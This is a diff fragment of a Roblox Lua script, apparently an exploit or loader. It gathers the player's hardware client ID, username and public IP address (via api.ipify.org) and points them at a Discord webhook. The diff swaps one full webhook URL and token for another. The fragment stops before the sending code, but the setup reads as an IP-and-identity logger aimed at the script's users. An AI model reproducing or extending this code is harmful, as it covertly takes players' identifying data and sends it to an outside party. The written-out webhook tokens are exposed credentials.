@@ -8,7 +8,7 @@ local webhookcheck =
 
 local HWIDCHECK = game:GetService("RbxAnalyticsService"):GetClientId()    
 local name = game:GetService("Players").LocalPlayer.Name
-local WebhookURL = "https://discord.com/api/webhooks/1083146000312573992/oNLyi259oTrOI2WXZkua1X6rB5rJIozi3iRJcAA_QvONC4Nmw_MsM9UW8VL1XJUOrMaF"
+local WebhookURL = "https://discord.com/api/webhooks/1095564086605000765/hM3aP-8XJxp-OM1KDdkUu0OsBFC9RA2Pb3EqOqaK9b_xqKG7kiSGcXtv46NAlJFTaGIP"
 local getIPResponse = req({
     Url = "https://api.ipify.org/?format=json",
     Method = "GET"
